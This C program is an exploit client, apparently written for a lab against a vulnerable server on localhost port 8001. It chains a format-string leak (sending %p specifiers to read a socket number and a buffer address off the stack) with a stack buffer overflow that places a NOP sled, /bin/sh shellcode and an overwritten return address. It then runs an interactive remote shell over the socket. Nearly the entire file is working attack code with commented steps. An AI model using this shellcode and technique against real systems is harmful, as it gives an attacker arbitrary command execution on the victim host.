
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <netdb.h>
#include <time.h>
#include <fcntl.h>

#define	PORTNUM	8001
#define	BLENGTH	256

/* convert address string to byte array with a possible offset */
char *
stringToAddress(char *asciiAddr, int offset) {
	unsigned int integerAddr;
	char *addr = malloc(4); 

	/* strtoul because the addresse if greater than LONG_MAX */
	integerAddr = (unsigned int)strtoul(asciiAddr, NULL, 16);

	integerAddr += offset;
	addr = memcpy(addr, (char *)(&integerAddr), 4);

	return addr;
}

/* convert string to string array, cut by a delimiter */
char **
strToWordtab(char *string, char *delimiter) {
	char **wordtab;
	char *token;
	unsigned int i = 0;

	wordtab = malloc(256);

	while ((token = strsep(&string, delimiter)) != NULL)
	{
		wordtab[i++] = token;
	}
	wordtab[i] = NULL;

	return wordtab;	
}


static void
exploit(int s)
{
	char **runtimeArray;						//array of datas collected at runtime
  	char buffer[BLENGTH];						//buffer used for communication
	char *answerAddress;						//address of the answer buffer on the server
	int socket;							//socket of the client on the server

	char shellcode[] = 
	"\xeb\x36\x31\xc0\x31\xdb\x88\xc3"
	"\xb0\x06\xcd\x80\xb3\x01\xb0\x06"
	"\xcd\x80\xb3\x02\xb0\x06\xcd\x80"
	"\xb3\x03\xb0\x29\xcd\x80\xb0\x29"
	"\xcd\x80\xb0\x29\xcd\x80\x5e\x31"
	"\xc0\x88\x46\x07\x50\x56\x31\xd2"
	"\x89\xe1\x89\xf3\xb0\x0b\xcd\x80"
	"\xe8\xc5\xff\xff\xff\x2f\x62\x69"
	"\x6e\x2f\x73\x68";


	/* Exploit snprintf vulnerability and get answer address */

  	recv(s, (void *)buffer, BLENGTH, 0);				// chose options string
	send(s, "%d %p %p %p %p %p %d %p %p\n", BLENGTH, 0); 		// Sending format specifiers
  	recv(s, (void *)buffer, BLENGTH, 0);				// wrong option string with stack informations
	runtimeArray = strToWordtab(buffer, " ");			// 6 = socket ; 8 = answer address  
	socket = strtol(runtimeArray[6], NULL, 10);
	answerAddress = runtimeArray[8];			
	answerAddress[strlen(answerAddress) - 1] = '\0';		// removing ; from the answer address
	char *payloadAddress = stringToAddress(answerAddress, 256);	// converting response string address to answer byte array
	
	send(s, "1\n", 2, 0);						// advancing to execute_command
  	recv(s, (void *)buffer, BLENGTH, 0);

	/* Exploit strcpy and inject payload */

	memset(buffer, '\x90', 128);					// filling buffer with NOP instruction
	strncpy(buffer, shellcode, strlen(shellcode));			// copying shellcode at the start of the buffer
	buffer[136] = payloadAddress[0]; 				// copying answer buffer address in the saved EIP
	buffer[137] = payloadAddress[1];				// anwer[128] + x(4) + EBP(4)
	buffer[138] = payloadAddress[2];
	buffer[139] = payloadAddress[3];
	buffer[140] = '\0';						// to prevent potential SEGFAULT
	buffer[25] = socket;						// replacing socket in shellcode by actual socket from server

	send(s, (void *)buffer, BLENGTH, 0);

	/* Keep communication with server using sockets and select */

	size_t ret = 0;
	fd_set rfds;
	fd_set wfds;
 	int retval;

	for (;;) {
		FD_ZERO(&rfds);						// clearing FD_SET
		FD_SET(0, &rfds);					// adding stdin to rfds
		FD_SET(s, &rfds);					// adding socket to rfds
		retval = select(s+1, &rfds, &wfds, NULL, NULL);		// waiting for datas on rfds fds
		if (retval == -1) {
			perror("select()");
			exit(1);
		}
		else {
			if (FD_ISSET(0, &rfds)) {			// new data on stdin ?
				fputs("\x1B[2J\x1B[H", stdout);		// clearing screen
				memset(buffer, '\0', BLENGTH);		// clear buffer
				fgets(buffer, BLENGTH, stdin);
				write(1, "###:>", 5);			// print prompt
				fputs(buffer, stdout);			// write back command
				write(1, "\n", 1);	
				send(s, buffer, BLENGTH, 0);		// send command to server
			}
			else if (FD_ISSET(s, &rfds)) {			// new data on socket ?
				ret = recv(s, buffer, BLENGTH, 0);	// reading data
				if (ret == 0)				// quitting on server disconnection
					exit(1);
				buffer[ret] = '\0';
				fputs(buffer, stdout);			// print response to client
			}
		}
	}
}

int
main(void)
{
  struct sockaddr_in server;
  struct hostent *host;
  int s;

  /* Create an Internet family, stream socket */
  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0) {
    perror("socket()");
    exit(EXIT_FAILURE);
  }

  /* Server listening on localhost interface */
  if ((host = gethostbyname("localhost")) == NULL) {
    perror("gethostbyname()");
    exit(EXIT_FAILURE);
  }

  /* Fill in socket address */
  memset((char *)&server, '\0', sizeof (server));
  server.sin_family = AF_INET;
  server.sin_port = htons(PORTNUM);
  memcpy((char *)&server.sin_addr, host->h_addr_list[0], host->h_length);

  /* Connect to server */
  if (connect(s, (struct sockaddr *)&server, sizeof (server)) < 0) {
    perror("connect()");
    exit(EXIT_FAILURE);
  }

  /* Talk to server */
  exploit(s);

  /* Close the socket */
  close(s);

  return (0);
}
